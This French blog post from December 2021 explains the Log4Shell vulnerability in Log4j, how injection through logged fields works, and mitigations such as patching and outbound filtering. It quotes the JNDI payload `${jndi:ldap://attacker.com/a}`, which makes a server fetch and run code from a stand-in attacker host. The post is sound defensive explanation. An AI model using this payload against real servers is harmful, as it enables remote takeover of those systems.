---
layout: post
title:  "Découverte d'une vulnérabilité critique dans log4j"
date:   2021-12-11 18:23:35 +0100
image:  '/images/blog/log4shell-explications/header.png'
tags:   [Cybersécurité]
---

Depuis hier, une **vulnérabilité 0-day** sur la plupart des serveurs Java est exploitée dans le monde entier via une faille dans Log4j. Twitter, Apple, Minecraft et même les voitures Tesla sont vulnérables.

Mini-article pour vous expliquer la faille la plus importante de 2021. 

<div class="gallery-box">
  <div class="gallery">
  <img src="/images/blog/log4shell-explications/1469719525671194626-FGVVMggWYAY81Mw.jpg" draggable="false">
  </div>
</div>

Vous vous souvenez de ShellShock ? Là c'est **100 fois pire**.

Baptisée Log4Shell, cette attaque permet d'obtenir un shell sur la machine de la victime en lui faisant simplement afficher une payload d'une vingtaine de caractères dans ses logs: `${jndi:ldap://attacker.com/a}`

Le vecteur d'injection est généralement très simple, il suffit de l'inclure dans un paramètre qui sera affiché dans les logs, par exemple à la place de l'adresse email dans la page de connexion.

On peut voir ici la vulnérabilité déclenchée sur la page de login Twitter : 

<div class="gallery-box">
  <div class="gallery">
  <img src="/images/blog/log4shell-explications/1469719531820093450-FGVw9U5XwAMTaaN.png" draggable="false">
  </div>
</div>

Au moment de gérer cette requête, le moteur Log4j interprète le ${...} comme un template, et essaie de **récupérer un fichier Java** à l'URL indiquée.

Ce fichier Java est ensuite exécuté et permet donc à l'attaquant de prendre complètement le contrôle du serveur.

Si vous utilisez Log4j en production (spoiler alert : c'est probablement le cas même si votre stack n'utilise pas Java), vous avez de grandes chances d'être vulnérables à cette vulnérabilité dont la sévérité CVSS est de 10.0, soit le maximum possible ! 

<div class="gallery-box">
  <div class="gallery">
  <img src="/images/blog/log4shell-explications/1469719537922846732-FGV2PgyWYAIM3Ey.png" draggable="false">
  </div>
</div>

La faille est activement exploitée dans la nature de manière massivement automatisée (notamment pour installer des ransomwares sur les serveurs), et il est nécessaire de prendre des mesures immédiates.

Heureusement, il est facile de se protéger, je vous fais une petite liste. 

<div class="gallery-box">
  <div class="gallery">
  <img src="/images/blog/log4shell-explications/1469719540095406083-FGV4bzoXwAkcFDl.jpg" draggable="false">
  </div>
</div>

- Installez le patch de sécurité 2.15.0 si vous utilisez Log4j dans votre code
- Utilisez les versions de JRE supérieures à 6u211, 7u201, 8u191, et 11.0.1 (qui désactivent la politique par défaut à l'origine du bug)
- Filtrez et surveillez les flux sortants de vos serveurs

Pour la prochaine fois, si vous voulez découvrir les vulnérabilités en direct histoire de pouvoir les corriger rapidement (et pas le lendemain via un de mes posts lol), je vous invite à suivre <a href="https://twitter.com/ANSSI_FR" target="_blank">@ANSSI_FR</a> et <a href="https://twitter.com/CERT_FR" target="_blank">@CERT_FR</a>.

Précision : utiliser une JRE à jour ne suffit pas pour être protégé, seulement contre la payload la plus courante. Merci <a href="https://twitter.com/gouttegd" target="_blank">@gouttegd</a> pour l'info ! 

<div class="gallery-box">
  <div class="gallery">
  <img src="/images/blog/log4shell-explications/1469732334324879364-FGWJxDfX0AYlK3x.jpg" draggable="false">
  </div>
</div>

